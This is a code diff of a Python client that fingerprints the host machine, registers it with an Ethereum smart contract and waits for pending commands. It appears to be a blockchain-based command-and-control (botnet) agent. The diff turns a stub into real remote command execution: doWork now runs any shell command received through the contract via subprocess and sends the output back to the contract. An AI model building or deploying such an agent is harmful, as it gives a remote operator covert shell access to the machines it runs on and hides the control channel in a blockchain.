@@ -9,10 +9,10 @@ from Util.Process import waitFor, kill_proc
 from Util.EtherKeysUtil import *
 from Util.EtherTransaction import *
 # import pyelliptic
+import subprocess as sp
 
 REGISTRATION_CONFIRMATION_EVENT_NAME = 'InstanceRegistered'
 COMMAND_PENDING_EVENT_NAME = 'CommandPending'
-from geth import DevGethProcess
 
 
 l = LogWrapper.getLogger()
@@ -50,6 +50,7 @@ class ClientCommands:
 		importAccountToNode(self.web3, self.address, self.private, self.password)
 
 		self.sessionId=None
+		self.gasLimit_ev = conf['gasLimit_ev']
 
 
 	def waitForNodeToSync(self):
@@ -75,7 +76,7 @@ class ClientCommands:
 		try:
 			machineId = OsInteractions.fingerprintMachine()
 			machineIdEnc = self.encryptMessageForServer(machineId)
-			self.contract.registerInstance(machineIdEnc, transact={'from': self.address, 'gas': 3000000})
+			self.contract.registerInstance(machineIdEnc, transact={'from': self.address, 'gas': self.gasLimit_ev})
 
 			self.commandFilter, eventABI = createLogEventFilter(REGISTRATION_CONFIRMATION_EVENT_NAME,
 																self.contractAbi,
@@ -97,17 +98,19 @@ class ClientCommands:
 		return self.registered()
 
 
-	def doWork(self, work):
+	def doWork(self, shell_cmd):
 		#TODO actually execute stuff...
-		return 'Awsome'
-
+		s, out = sp.getstatusoutput(shell_cmd)
+		ret = { 'status': s,
+				'output': out[:32] }
+		return json.dumps(ret)
 
 	def sendResults(self, cmdId, workResults):
-		l.info("sending results of cmdId",cmdId,"to server. result:",workResults[0:30],'...')
+		l.info("sending results of cmdId",cmdId,"to server. result:", workResults,'...')
 		machineId = OsInteractions.fingerprintMachine()
 		sessionAndMachineIdHash = toBytes32Hash(self.sessionId + machineId)
 		#function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId)
-		self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': 3000000})
+		self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': self.gasLimit_ev})
 
 	def decryptMessageFromServer(self, msg, encrypt=True):
 		# TODO compelete
